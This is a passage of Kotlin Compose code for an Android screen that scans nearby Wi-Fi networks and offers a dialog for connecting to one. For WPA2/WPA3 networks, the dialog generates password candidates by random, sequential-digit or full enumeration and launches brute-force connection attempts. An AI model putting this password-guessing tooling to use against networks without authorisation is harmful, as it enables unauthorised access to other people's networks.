                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(
                            Icons.AutoMirrored.Filled.ArrowBack,
                            contentDescription = stringResource(R.string.back),
                        )
                    }
                },
            )
        },
    ) { padding ->
        Column(
            Modifier
                .padding(padding)
                .fillMaxSize()
                .padding(horizontal = 20.dp, vertical = 12.dp),
            verticalArrangement = Arrangement.spacedBy(12.dp),
        ) {
            Text(
                text = stringResource(R.string.experiment_wifi_intro),
                style = MaterialTheme.typography.bodyMedium,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
            )
            Text(
                text = stringResource(R.string.experiment_wifi_tap_to_connect),
                style = MaterialTheme.typography.labelLarge,
                color = MaterialTheme.colorScheme.primary,
            )

            if (!wifiOn) {
                Text(
                    text = stringResource(R.string.experiment_wifi_disabled),
                    style = MaterialTheme.typography.bodyLarge,
                    color = MaterialTheme.colorScheme.error,
                )
            }

            if (!canUseWifiApis) {
                Text(
                    text = stringResource(R.string.experiment_wifi_need_location),
                    style = MaterialTheme.typography.bodyMedium,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
                if (needNearbyWifi && hasFineLocation && !hasNearbyWifi) {
                    Text(
                        text = stringResource(R.string.experiment_wifi_need_nearby),
                        style = MaterialTheme.typography.bodyMedium,
                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                    )
                }
                FilledTonalButton(
                    onClick = {
                        val perms = buildList {
                            add(Manifest.permission.ACCESS_FINE_LOCATION)
                            if (needNearbyWifi) add(Manifest.permission.NEARBY_WIFI_DEVICES)
                        }.toTypedArray()
                        wifiPermLauncher.launch(perms)
                    },
                    modifier = Modifier.fillMaxWidth(),
                ) {
                    Text(stringResource(R.string.experiment_wifi_grant_permissions))
                }
            } else {
                FilledTonalButton(
                    onClick = {
                        scanning = true
                        @Suppress("DEPRECATION")
                        wifiManager.startScan()
                    },
                    modifier = Modifier.fillMaxWidth(),
                    enabled = wifiOn && !scanning,
                ) {
                    Text(
                        if (scanning) {
                            stringResource(R.string.experiment_wifi_scanning)
                        } else {
                            stringResource(R.string.experiment_wifi_scan)
                        },
                    )
                }
            }

            bruteProgress?.let { st ->
                Text(
                    text = stringResource(R.string.experiment_wifi_brute_trying, st.currentPassword),
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.primary,
                )
                Text(
                    text = stringResource(
                        R.string.experiment_wifi_brute_queue,
                        st.remainingInList,
                        st.initialTotal,
                    ),
                    style = MaterialTheme.typography.labelSmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
                val doneFrac =
                    if (st.initialTotal > 0) {
                        (st.initialTotal - st.remainingInList).toFloat() / st.initialTotal
                    } else {
                        0f
                    }
                LinearProgressIndicator(
                    progress = { doneFrac },
                    modifier = Modifier.fillMaxWidth(),
                )
            }

            if (pendingWifiConnect != null) {
                Text(
                    text = stringResource(R.string.experiment_wifi_active_connection_hint),
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.primary,
                )
                Spacer(Modifier.height(8.dp))
            }
            if (pendingWifiConnect != null || bruteJob?.isActive == true) {
                OutlinedButton(
                    onClick = {
                        val wasBrute = bruteJob?.isActive == true
                        cancelActiveConnection()
                        if (!wasBrute) {
                            Toast.makeText(
                                appContext,
                                appContext.getString(R.string.experiment_wifi_request_cancelled),
                                Toast.LENGTH_SHORT,
                            ).show()
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                ) {
                    Text(stringResource(R.string.experiment_wifi_cancel_connect))
                }
            }

            if (scanning) {
                LinearProgressIndicator(Modifier.fillMaxWidth())
            }

            HorizontalDivider()

            if (canUseWifiApis && wifiOn && scanResults.isEmpty() && !scanning) {
                Text(
                    text = stringResource(R.string.experiment_wifi_empty),
                    style = MaterialTheme.typography.bodyMedium,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
            }

            LazyColumn(
                modifier = Modifier.weight(1f),
                verticalArrangement = Arrangement.spacedBy(8.dp),
                contentPadding = PaddingValues(bottom = 24.dp),
            ) {
                items(
                    items = scanResults,
                    key = { "${it.BSSID}_${it.frequency}_${it.level}_${it.displaySsid()}" },
                ) { scan ->
                    WifiScanResultCard(
                        scan = scan,
                        onClick = { pickedScan = scan },
                    )
                }
            }
        }
    }
}

@SuppressLint("MissingPermission")
private fun readSortedScanResults(wifiManager: WifiManager): List<ScanResult> {
    return try {
        wifiManager.scanResults
            .filter { it.BSSID.isNotBlank() }
            .distinctBy { "${it.BSSID}_${it.frequency}" }
            .sortedByDescending { it.level }
    } catch (_: SecurityException) {
        emptyList()
    }
}

@Suppress("DEPRECATION")
private fun ScanResult.displaySsid(): String {
    val raw = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        wifiSsid?.toString()?.trim('"') ?: ""
    } else {
        SSID?.trim('"') ?: ""
    }
    return when (raw) {
        "",
        "<unknown ssid>",
        "[SSID]",
        -> ""
        else -> raw
    }
}

private fun wifiChannelFromFrequencyMhz(frequency: Int): String {
    val ch = when {
        frequency in 2412..2484 -> (frequency - 2407) / 5
        frequency in 5160..5885 -> (frequency - 5000) / 5
        else -> null
    }
    return ch?.toString() ?: "—"
}

@Composable
private fun WifiConnectDialog(
    scan: ScanResult,
    wifiApisReady: Boolean,
    candidateLinesState: MutableState<String>,
    onDismiss: () -> Unit,
    onConnect: (manualSsid: String, password: String) -> Unit,
    onBruteForce: (manualSsid: String, passwords: List<String>) -> Unit,
    onStreamingGenBrute: (scan: ScanResult, manualSsid: String, config: StreamingGenConfig) -> Unit,
) {
    val security = remember(scan) { scan.apSecurity() }
    var password by remember(scan) { mutableStateOf("") }
    var manualSsid by remember(scan) { mutableStateOf("") }
    var fieldError by remember(scan) { mutableStateOf<String?>(null) }

    var genDigit by remember(scan) { mutableStateOf(true) }
    var genLower by remember(scan) { mutableStateOf(true) }
    var genUpper by remember(scan) { mutableStateOf(true) }
    var genSpecial by remember(scan) { mutableStateOf(true) }
    var genLen by remember(scan) { mutableIntStateOf(8) }
    var genMode by remember(scan) { mutableStateOf(WifiPasswordGenMode.RANDOM) }
    var genRandomCount by remember(scan) { mutableStateOf("200") }
    var genSeqSteps by remember(scan) { mutableStateOf("10000") }
    val scope = rememberCoroutineScope()
    var addingCandidates by remember { mutableStateOf(false) }

    val titleSsid = scan.displaySsid().ifBlank { stringResource(R.string.experiment_wifi_hidden_ssid) }
    val errPasswordShort = stringResource(R.string.experiment_wifi_error_password_short)
    val errSsidRequired = stringResource(R.string.experiment_wifi_error_ssid_required)
    val bruteNoCandidates = stringResource(R.string.experiment_wifi_brute_no_candidates)
    val bruteLimitFmt = stringResource(R.string.experiment_wifi_brute_limit, BRUTE_MAX_PASSWORDS)
    val genCharsetEmpty = stringResource(R.string.experiment_wifi_gen_charset_empty)
    val genSeqDigitsOnly = stringResource(R.string.experiment_wifi_gen_seq_digits_only)
    val genFullTooLarge = stringResource(R.string.experiment_wifi_gen_full_too_large, GEN_FULL_ENUM_MAX)
    val genInvalidCount = stringResource(R.string.experiment_wifi_gen_invalid_count)
    val addListLimitFmt = stringResource(R.string.experiment_wifi_gen_add_list_limit, GEN_ADD_LIST_MAX_LINES)
    val scroll = rememberScrollState()
    val needPermHint = stringResource(R.string.experiment_wifi_connect_need_permissions)
    val streamNeedLen = stringResource(R.string.experiment_wifi_stream_need_wpa_len)

    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text(stringResource(R.string.experiment_wifi_connect_dialog_title)) },
        text = {
            Column(Modifier.verticalScroll(scroll)) {
                Text(
                    text = titleSsid,
                    style = MaterialTheme.typography.titleSmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                )
                Spacer(Modifier.height(8.dp))
                if (!wifiApisReady) {
                    Text(
                        text = needPermHint,
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.error,
                    )
                    Spacer(Modifier.height(8.dp))
                }
                when (security) {
                    WifiApSecurity.UNSUPPORTED -> {
                        Text(stringResource(R.string.experiment_wifi_unsupported_security))
                    }
                    WifiApSecurity.OPEN -> {
                        Text(stringResource(R.string.experiment_wifi_open_network))
                    }
                    WifiApSecurity.WPA2,
                    WifiApSecurity.WPA3,
                    -> {
                        if (scan.displaySsid().isBlank()) {
                            OutlinedTextField(
                                value = manualSsid,
                                onValueChange = { manualSsid = it; fieldError = null },
                                label = { Text(stringResource(R.string.experiment_wifi_ssid_manual)) },
                                singleLine = true,
                                modifier = Modifier.fillMaxWidth(),
                            )
                            Spacer(Modifier.height(8.dp))
                        }
                        OutlinedTextField(
                            value = password,
                            onValueChange = { password = it; fieldError = null },
                            label = { Text(stringResource(R.string.experiment_wifi_password)) },
                            singleLine = true,
                            visualTransformation = PasswordVisualTransformation(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
                            modifier = Modifier.fillMaxWidth(),
                        )
                        Spacer(Modifier.height(10.dp))
                        Text(
                            text = stringResource(R.string.experiment_wifi_brute_disclaimer),
                            style = MaterialTheme.typography.labelSmall,
                            color = MaterialTheme.colorScheme.error,
                        )
                        Spacer(Modifier.height(8.dp))
                        Text(
                            text = stringResource(R.string.experiment_wifi_gen_title),
                            style = MaterialTheme.typography.titleSmall,
                        )
                        Spacer(Modifier.height(6.dp))
                        Row(
                            modifier = Modifier.horizontalScroll(rememberScrollState()),
                            horizontalArrangement = Arrangement.spacedBy(8.dp),
                        ) {
                            FilterChip(
                                selected = genDigit,
                                onClick = { genDigit = !genDigit; fieldError = null },
                                label = { Text(stringResource(R.string.experiment_wifi_gen_digits)) },
                            )
                            FilterChip(
                                selected = genLower,
                                onClick = { genLower = !genLower; fieldError = null },
                                label = { Text(stringResource(R.string.experiment_wifi_gen_lower)) },
                            )
                            FilterChip(
                                selected = genUpper,
                                onClick = { genUpper = !genUpper; fieldError = null },
                                label = { Text(stringResource(R.string.experiment_wifi_gen_upper)) },
                            )
                            FilterChip(
                                selected = genSpecial,
                                onClick = { genSpecial = !genSpecial; fieldError = null },
                                label = { Text(stringResource(R.string.experiment_wifi_gen_special)) },
                            )
                        }
                        Text(
                            text = stringResource(R.string.experiment_wifi_gen_length, genLen),
                            style = MaterialTheme.typography.bodySmall,
                        )
                        Slider(
                            value = genLen.toFloat(),
                            onValueChange = {
                                genLen = it.roundToInt().coerceIn(GEN_LENGTH_MIN, GEN_LENGTH_MAX)
                                fieldError = null
                            },
                            valueRange = GEN_LENGTH_MIN.toFloat()..GEN_LENGTH_MAX.toFloat(),
                        )
                        Text(
                            text = stringResource(R.string.experiment_wifi_gen_mode_label),
                            style = MaterialTheme.typography.labelMedium,
                        )
                        Row(
                            modifier = Modifier.horizontalScroll(rememberScrollState()),
                            horizontalArrangement = Arrangement.spacedBy(8.dp),
                        ) {
                            FilterChip(
                                selected = genMode == WifiPasswordGenMode.RANDOM,
                                onClick = { genMode = WifiPasswordGenMode.RANDOM; fieldError = null },
                                label = { Text(stringResource(R.string.experiment_wifi_gen_mode_random)) },
                            )
                            FilterChip(
                                selected = genMode == WifiPasswordGenMode.SEQUENTIAL_DIGITS,
                                onClick = {
                                    genMode = WifiPasswordGenMode.SEQUENTIAL_DIGITS
                                    fieldError = null
                                },
                                label = { Text(stringResource(R.string.experiment_wifi_gen_mode_sequential)) },
                            )
                            FilterChip(
                                selected = genMode == WifiPasswordGenMode.FULL_ENUMERATION,
                                onClick = {
                                    genMode = WifiPasswordGenMode.FULL_ENUMERATION
                                    fieldError = null
                                },
                                label = { Text(stringResource(R.string.experiment_wifi_gen_mode_full)) },
                            )
                        }
                        when (genMode) {
                            WifiPasswordGenMode.RANDOM -> {
                                OutlinedTextField(
                                    value = genRandomCount,
                                    onValueChange = { genRandomCount = it; fieldError = null },
                                    label = { Text(stringResource(R.string.experiment_wifi_gen_count_random)) },
                                    singleLine = true,
                                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                                    modifier = Modifier.fillMaxWidth(),
                                )
                            }
                            WifiPasswordGenMode.SEQUENTIAL_DIGITS -> {
                                OutlinedTextField(
                                    value = genSeqSteps,
                                    onValueChange = { genSeqSteps = it; fieldError = null },
                                    label = { Text(stringResource(R.string.experiment_wifi_gen_count_sequential)) },
                                    singleLine = true,
                                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                                    modifier = Modifier.fillMaxWidth(),
                                )
                            }
                            WifiPasswordGenMode.FULL_ENUMERATION -> Unit
                        }
                        OutlinedButton(
                            onClick = {
                                fieldError = null
                                val effLen = effectiveWpaGenLength(genLen)
                                val charset = buildWifiCharset(genDigit, genLower, genUpper, genSpecial)
                                if (charset.isEmpty()) {
                                    fieldError = genCharsetEmpty
                                    return@OutlinedButton
                                }
                                when (genMode) {
                                    WifiPasswordGenMode.RANDOM -> {
                                        val c = genRandomCount.toIntOrNull()
                                        if (c == null || c < 1) {
                                            fieldError = genInvalidCount
                                            return@OutlinedButton
                                        }
                                        if (c > GEN_ADD_LIST_MAX_LINES) {
                                            fieldError = addListLimitFmt
                                            return@OutlinedButton
                                        }
                                    }
                                    WifiPasswordGenMode.SEQUENTIAL_DIGITS -> {
                                        if (!genDigit || genLower || genUpper || genSpecial) {
                                            fieldError = genSeqDigitsOnly
                                            return@OutlinedButton
                                        }
                                        val steps = genSeqSteps.toIntOrNull()
                                        if (steps == null || steps < 1) {
                                            fieldError = genInvalidCount
                                            return@OutlinedButton
                                        }
                                        if (steps > GEN_ADD_LIST_MAX_LINES) {
                                            fieldError = addListLimitFmt
                                            return@OutlinedButton
                                        }
                                    }
                                    WifiPasswordGenMode.FULL_ENUMERATION -> {
                                        val cnt = fullEnumerationCount(charset.size, effLen)
                                        if (cnt > GEN_FULL_ENUM_MAX) {
                                            fieldError = genFullTooLarge
                                            return@OutlinedButton
                                        }
                                        if (cnt > GEN_ADD_LIST_MAX_LINES) {
                                            fieldError = addListLimitFmt
                                            return@OutlinedButton
                                        }
                                    }
                                }
                                scope.launch {
                                    addingCandidates = true
                                    try {
                                        val generated = withContext(Dispatchers.Default) {
                                            when (genMode) {
                                                WifiPasswordGenMode.RANDOM -> {
                                                    val c = genRandomCount.toIntOrNull()!!.coerceIn(
                                                        1,
                                                        minOf(GEN_RANDOM_MAX_BATCH, GEN_ADD_LIST_MAX_LINES),
                                                    )
                                                    generateRandomWifiPasswords(charset, effLen, c)
                                                }
                                                WifiPasswordGenMode.SEQUENTIAL_DIGITS -> {
                                                    val steps = genSeqSteps.toIntOrNull()!!.coerceIn(
                                                        1,
                                                        GEN_ADD_LIST_MAX_LINES,
                                                    )
                                                    generateSequentialDigitPasswords(effLen, steps)
                                                }
                                                WifiPasswordGenMode.FULL_ENUMERATION -> {
                                                    generateFullEnumeration(charset, effLen) ?: emptyList()
                                                }
                                            }
                                        }
                                        if (generated.isEmpty()) {
                                            fieldError = bruteNoCandidates
                                            return@launch
                                        }
                                        val existing = candidateLinesState.value.lines()
                                            .map { it.trim() }
                                            .filter { it.isNotEmpty() }
                                            .toMutableSet()
                                        for (p in generated) existing.add(p)
                                        candidateLinesState.value = existing.joinToString("\n")
                                    } finally {
                                        addingCandidates = false
                                    }
                                }
                            },
                            enabled = !addingCandidates,
                            modifier = Modifier.fillMaxWidth(),
                        ) {
                            Text(
                                if (addingCandidates) {
                                    stringResource(R.string.experiment_wifi_gen_adding)
                                } else {
                                    stringResource(R.string.experiment_wifi_gen_add)
                                },
                            )
                        }
                        Text(
                            text = stringResource(R.string.experiment_wifi_brute_wpa_len_note),
                            style = MaterialTheme.typography.labelSmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                        )
                        Spacer(Modifier.height(8.dp))
                        OutlinedTextField(
                            value = candidateLinesState.value,
                            onValueChange = { candidateLinesState.value = it; fieldError = null },
                            label = { Text(stringResource(R.string.experiment_wifi_brute_list_hint)) },
                            minLines = 4,
                            maxLines = 8,
                            modifier = Modifier.fillMaxWidth(),
                        )
                        Spacer(Modifier.height(8.dp))
                        OutlinedButton(
                            onClick = {
                                fieldError = null
                                if (!wifiApisReady) {
                                    fieldError = needPermHint
                                    return@OutlinedButton
                                }
                                if (scan.displaySsid().isBlank() && manualSsid.isBlank()) {
                                    fieldError = errSsidRequired
                                    return@OutlinedButton
                                }
                                val list = candidateLinesState.value.lines()
                                    .map { it.trim() }
                                    .filter { it.length in WPA_PSK_MIN_LEN..WPA_PSK_MAX_LEN }
                                    .distinct()
                                if (list.isEmpty()) {
                                    fieldError = bruteNoCandidates
                                    return@OutlinedButton
                                }
                                if (list.size > BRUTE_MAX_PASSWORDS) {
                                    fieldError = bruteLimitFmt
                                    return@OutlinedButton
                                }
                                onBruteForce(manualSsid, list)
                            },
                            modifier = Modifier.fillMaxWidth(),
                        ) {
                            Text(stringResource(R.string.experiment_wifi_brute_run))
                        }
                        Spacer(Modifier.height(8.dp))
                        OutlinedButton(
                            onClick = {
                                fieldError = null
                                if (!wifiApisReady) {
                                    fieldError = needPermHint
                                    return@OutlinedButton
                                }
                                if (scan.displaySsid().isBlank() && manualSsid.isBlank()) {
                                    fieldError = errSsidRequired
                                    return@OutlinedButton
                                }
                                val effLen = effectiveWpaGenLength(genLen)
                                if (effLen < WPA_PSK_MIN_LEN) {
                                    fieldError = streamNeedLen
                                    return@OutlinedButton
                                }
                                val charset = buildWifiCharset(genDigit, genLower, genUpper, genSpecial)
                                if (charset.isEmpty()) {
                                    fieldError = genCharsetEmpty
                                    return@OutlinedButton
                                }
                                val cfg: StreamingGenConfig = when (genMode) {
                                    WifiPasswordGenMode.RANDOM -> {
                                        StreamingGenConfig(
                                            mode = genMode,
                                            charset = charset,
                                            effLen = effLen,
                                            sequentialSteps = 0,
                                            fullEnumTotal = 0L,
                                        )
                                    }
                                    WifiPasswordGenMode.SEQUENTIAL_DIGITS -> {
                                        if (!genDigit || genLower || genUpper || genSpecial) {
                                            fieldError = genSeqDigitsOnly
                                            return@OutlinedButton
                                        }
                                        val steps = genSeqSteps.toIntOrNull()
                                            ?.coerceIn(1, GEN_SEQUENTIAL_STREAM_MAX_STEPS)
                                        if (steps == null) {
                                            fieldError = genInvalidCount
                                            return@OutlinedButton
                                        }
                                        StreamingGenConfig(
                                            mode = genMode,
                                            charset = charset,
                                            effLen = effLen,
                                            sequentialSteps = steps,
                                            fullEnumTotal = 0L,
                                        )
                                    }
                                    WifiPasswordGenMode.FULL_ENUMERATION -> {
                                        val cnt = fullEnumerationCount(charset.size, effLen)
                                        if (cnt > GEN_FULL_ENUM_MAX) {
                                            fieldError = genFullTooLarge
                                            return@OutlinedButton
                                        }
                                        if (cnt == 0L) {
                                            fieldError = bruteNoCandidates
                                            return@OutlinedButton
                                        }
                                        StreamingGenConfig(
                                            mode = genMode,
                                            charset = charset,
                                            effLen = effLen,
                                            sequentialSteps = 0,
                                            fullEnumTotal = cnt,
                                        )
                                    }
                                }
                                onStreamingGenBrute(scan, manualSsid, cfg)
                            },
                            modifier = Modifier.fillMaxWidth(),
                        ) {
                            Text(stringResource(R.string.experiment_wifi_stream_brute_run))
                        }
                    }
                }
                fieldError?.let { err ->
                    Spacer(Modifier.height(8.dp))
                    Text(err, color = MaterialTheme.colorScheme.error, style = MaterialTheme.typography.bodySmall)
                }
            }
        },
        confirmButton = {
            when (security) {
                WifiApSecurity.UNSUPPORTED -> {
                    TextButton(onClick = onDismiss) {
                        Text(stringResource(R.string.experiment_wifi_got_it))
                    }
                }
                else -> {
                    TextButton(
                        enabled = wifiApisReady,
                        onClick = {
                            fieldError = null
                            if (!wifiApisReady) {
                                fieldError = needPermHint
                                return@TextButton
                            }
                            when (security) {
                                WifiApSecurity.OPEN -> onConnect("", "")
                                WifiApSecurity.WPA2,
                                WifiApSecurity.WPA3,
                                -> {
                                    val pw = password.trim()
                                    if (pw.length !in WPA_PSK_MIN_LEN..WPA_PSK_MAX_LEN) {
                                        fieldError = errPasswordShort
                                        return@TextButton
                                    }
                                    if (scan.displaySsid().isBlank() && manualSsid.isBlank()) {
                                        fieldError = errSsidRequired
                                        return@TextButton
                                    }
                                    onConnect(manualSsid, pw)
                                }
                                WifiApSecurity.UNSUPPORTED -> Unit
                            }
                        },
                    ) {
                        Text(stringResource(R.string.experiment_wifi_connect))
                    }
                }
            }
        },
        dismissButton = {
            if (security != WifiApSecurity.UNSUPPORTED) {
                TextButton(onClick = onDismiss) {
                    Text(stringResource(R.string.experiment_wifi_cancel))
                }
            }
        },
    )
}

@Composable
private fun WifiScanResultCard(
    scan: ScanResult,
    onClick: () -> Unit,
) {
    val ssidRaw = scan.displaySsid()
    val title = if (ssidRaw.isBlank()) {
        stringResource(R.string.experiment_wifi_hidden_ssid)
    } else {
        ssidRaw
    }
    val channel = wifiChannelFromFrequencyMhz(scan.frequency)
    val signalLabel = stringResource(R.string.experiment_wifi_signal_dbm)
    val channelLabel = stringResource(R.string.experiment_wifi_channel)
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .clickable(onClick = onClick),
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.42f),
        ),
    ) {
        Column(Modifier.padding(14.dp)) {
            Text(text = title, style = MaterialTheme.typography.titleSmall)
            Text(
                text = scan.BSSID,
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
            )
            Text(
                text = "$signalLabel: ${scan.level} dBm · ${scan.frequency} MHz · $channelLabel: $channel",
                style = MaterialTheme.typography.bodySmall,
            )
            Text(
                text = scan.capabilities.ifBlank { "—" },
                style = MaterialTheme.typography.labelSmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant,
            )
        }
    }
}
